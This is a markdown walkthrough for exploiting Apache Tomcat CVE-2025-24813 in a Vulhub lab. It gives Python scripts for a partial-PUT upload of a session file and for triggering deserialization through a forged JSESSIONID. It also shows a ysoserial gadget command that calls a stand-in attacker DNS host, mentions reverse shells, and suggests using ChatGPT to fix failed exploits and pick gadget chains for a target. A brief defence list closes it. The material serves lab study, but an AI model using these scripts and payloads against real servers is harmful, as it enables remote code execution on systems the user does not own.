# üß® Exploiting Apache Tomcat (CVE-2025-24813) ‚Äì Path Equivalence & File-Based Deserialization

> A step-by-step walkthrough of exploiting misconfigured Tomcat servers via a deserialization flaw caused by unsafe default settings.

---

## üìå Overview

* **Name**: Apache Tomcat Path Equivalence Deserialization RCE
* **CVE**: [CVE-2025-24813](https://www.exploit-db.com/exploits/52134)
* **Author**: Al Baradi Joy
* **Date**: April 2025
* **Vulnerability Type**: Remote Code Execution (via unsafe deserialization)
* **Category**: Path Equivalence, Deserialization Gadget Chains

---

## üß™ Vulnerability Summary

The attack leverages **two misconfigurations** in Apache Tomcat:

1. `DefaultServlet` is configured with `readonly=false`, allowing **file uploads** via `PUT` requests.
2. Tomcat is configured to use **file-based session persistence** at:

   ```
   $CATALINA_BASE/work/Catalina/localhost/ROOT/
   ```

By combining these, you can upload a malicious `.session` file and **trigger its deserialization** using a specially crafted `JSESSIONID`.

---

## ‚öôÔ∏è Lab Setup (Vulhub or Manual)

### ‚úÖ Step 1: Start the Vulhub Lab

```bash
cd ~/labs/vulhub/tomcat/CVE-2025-24813
docker compose up -d
```

### ‚úÖ Step 2: Confirm It's Running

```bash
docker compose ps
```

Output should show:

```
0.0.0.0:8080->8080/tcp
```

Open [http://localhost:8080](http://localhost:8080) in your browser ‚Äî you should see a default Tomcat welcome page or `/examples`.

---

## üìñ Step 3: Understand the Vulnerable Configuration

### Key lines from `web.xml` and `context.xml`:

```xml
<init-param>
  <param-name>readonly</param-name>
  <param-value>false</param-value>
</init-param>
```

```xml
<Manager className="org.apache.catalina.session.PersistentManager">
  <Store className="org.apache.catalina.session.FileStore"/>
</Manager>
```

> ‚ùó This combo means: **you can write to disk**, and **Tomcat will deserialize files** using filenames derived from session IDs.

---

## üí£ Step 4: Exploit in Two Stages

---

### ‚úÖ Part A: Upload the Deserialization Payload

Craft a **partial PUT** request with a filename that maps to a `.session` file on disk.

> Tomcat maps `/` to `.` and stores under:
> `$CATALINA_BASE/work/Catalina/localhost/ROOT/.deserialize.session`

### üõ†Ô∏è Python Script (`upload_payload.py`):

```python
import requests

url = "http://localhost:8080/deserialize/session"
headers = {
    "Content-Range": "bytes 0-5/10",
    "Content-Length": "20",
}
payload = b"deserialize content"  # Replace with serialized object in real attack

response = requests.put(url, headers=headers, data=payload)
print(f"[+] Status: {response.status_code}")
```

---

### ‚úÖ Part B: Trigger Deserialization

Send a request with a forged `JSESSIONID` matching the name `.deserialize`.

### üõ†Ô∏è Python Script (`trigger_payload.py`):

```python
import requests

url = "http://localhost:8080/"
cookies = {"JSESSIONID": ".deserialize"}

response = requests.get(url, cookies=cookies)
print(f"[+] Status: {response.status_code}")
print("[+] Trigger request sent. Check DNS or command execution channel.")
```

---

## üß™ Step 5: Observing the Impact

In a real-world attack:

* The payload would be a **gadget chain** (e.g., URLDNS, CommonsCollections)
* A successful attack could:

  * Send DNS requests (OOB detection)
  * Execute commands
  * Open reverse shells

> ‚úÖ With URLDNS: you'd see a DNS lookup to your listener domain
> ‚úÖ With ysoserial: you could pop a shell via RCE

---

## üß† Step 6: Understanding Why It Works

* Tomcat stores session data in files named after `JSESSIONID`
* You can upload arbitrary files via `PUT`
* If you name your file `deserialize/session`, it maps to `.deserialize.session` on disk
* When you send `JSESSIONID=.deserialize`, Tomcat loads `.deserialize.session` and **deserializes it**

---

## üß∞ Optional: Build a Real Gadget Payload

### üîß Tool: [ysoserial](https://github.com/frohoff/ysoserial)

```bash
java -jar ysoserial.jar URLDNS http://attacker.dnslog.cn > payload.session
```

### Upload the actual file (instead of dummy string):

```python
with open("payload.session", "rb") as f:
    content = f.read()
```

And send it using the previous `PUT` method.

---

## üß™ Use ChatGPT to Iterate

If the exploit doesn‚Äôt trigger:

* Ask:

  > ‚ÄúI uploaded a .session file using PUT and sent a forged JSESSIONID, but nothing happened. What should I check?‚Äù

ChatGPT can help you:

* Debug Content-Range usage
* Validate file path mappings
* Rebuild serialized objects correctly
* Find correct gadget chains for your target

---

## üîê Defending Against It

* **Never set `readonly=false`** in DefaultServlet in production
* **Disable file-based session persistence**, use memory-based sessions instead
* Sanitize upload paths
* Block `PUT` requests on web roots
* Use a web application firewall (WAF)

---

## ‚úÖ Final Exploitation Recap

| Step | Description                              |
| ---- | ---------------------------------------- |
| 1    | Launch vulnerable Tomcat container       |
| 2    | Confirm port 8080 is up                  |
| 3    | Read README or ExploitDB notes           |
| 4    | Upload `.session` file via PUT           |
| 5    | Trigger deserialization via `JSESSIONID` |
| 6    | Observe command or DNS result            |
| 7    | Expand using ysoserial gadget            |
| 8    | Iterate with ChatGPT if blocked          |

---
